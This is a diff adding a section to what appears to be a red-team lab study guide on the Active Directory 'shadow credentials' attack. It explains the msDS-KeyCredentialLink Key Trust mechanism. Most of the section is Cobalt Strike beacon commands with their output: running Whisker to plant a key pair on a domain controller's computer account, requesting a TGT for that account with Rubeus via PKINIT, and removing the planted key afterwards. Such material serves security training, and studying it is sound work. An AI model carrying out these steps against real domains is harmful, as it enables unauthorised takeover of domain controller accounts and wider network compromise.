@@ -1090,4 +1090,89 @@ And the rest of the attack is the same.
 
 Whilst Kerberos pre-authentication is typically carried out using a symmetric key derived from a client's password, asymmetric keys are also possible via Public Key Cryptography for Initial Authentication (PKINIT).&#x20;
 
+### Certificate Trust Model
+
 If a PKI solution is in place, such as Active Directory Certificate Services, the Domain Controllers and domain members exchange their public keys via the appropriate Certificate Authority. This is called the Certificate Trust Model.
+
+### Key Trust Model
+
+This is where trust is established based on raw key data rather than a certificate. This requires a client to store their key on their own domain object in an attribute called <mark style="color:yellow;">`msDS-KeyCredentialLink`</mark>.
+
+### How the Shadow Credentials Attack Works
+
+The basis of the "shadow credentials" attack is that if you can write to this attribute (<mark style="color:yellow;">`msDS-KeyCredentialLink`</mark>), on a user or computer object, you can obtain a TGT for that principal. As such, this is a DACL-style abuse as with RBCD.
+
+Along with his excellent [blog post](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) on the subject, [Elad Shamir](https://twitter.com/elad_shamir) published a tool called [<mark style="color:yellow;">`Whisker`</mark>](https://github.com/eladshamir/Whisker), <mark style="color:$success;">which makes exploiting this very easy</mark>. &#x20;
+
+### Performing the Attack
+
+**First, we want to&#x20;**<mark style="color:yellow;">**list any keys that might already be present for a target**</mark>**&#x20;- this is important for when we want to clean up later:**
+
+```
+beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
+[*] Searching for the target account
+[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
+[*] Listing deviced for dc-2$:
+[*] No entries!
+```
+
+**Add a&#x20;**<mark style="color:yellow;">**new key pair**</mark>**&#x20;to the target:**
+
+```
+beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$
+[*] No path was provided. The certificate will be printed as a Base64 blob
+[*] No pass was provided. The certificate will be stored with the password y52EhYqlfgnYPuRb
+[*] Searching for the target account
+[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID 58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+```
+
+**And now, we can&#x20;**<mark style="color:yellow;">**ask for a TGT using the Rubeus**</mark>**&#x20;command that Whisker provides:**
+
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA[...snip...]ICB9A= /password:"y52EhYqlfgnYPuRb" /nowrap
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=dc-2$ 
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\dc-2$'
+[*] Using domain controller: 10.10.122.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+doIGaj [...snip...] MuaW8=
+
+  ServiceName              :  krbtgt/dev.cyberbotic.io
+  ServiceRealm             :  DEV.CYBERBOTIC.IO
+  UserName                 :  dc-2$
+  UserRealm                :  DEV.CYBERBOTIC.IO
+  StartTime                :  1/21/2023 7:12:27 PM
+  EndTime                  :  1/22/2023 5:12:27 AM
+  RenewTill                :  1/28/2023 7:12:27 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  bKJ76Br5CFOL6zckBpl9IA==
+  ASREP (key)              :  B0AA392AE0C969E268DAC4462D76FC90
+```
+
+Whisker's <mark style="color:yellow;">`clear`</mark> command will remove any and all keys from <mark style="color:yellow;">`msDS-KeyCredentialLink`</mark>. &#x20;
+
+<mark style="color:$danger;">This is a bad idea if a key was already present</mark>, because it will <mark style="color:$danger;">break legitimate passwordless authentication that was in place</mark>.  If this was the case, <mark style="color:$success;">you can list the entries again and only remove the one you want</mark>.
+
+```
+beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
+[*] Searching for the target account
+[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
+[*] Listing deviced for dc-2$:
+    DeviceID: 58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403 | Creation Time: 1/21/2023 7:19:04 PM
+
+beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:dc-2$ /deviceid:58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
+[*] Searching for the target account
+[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Found value to remove
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+```
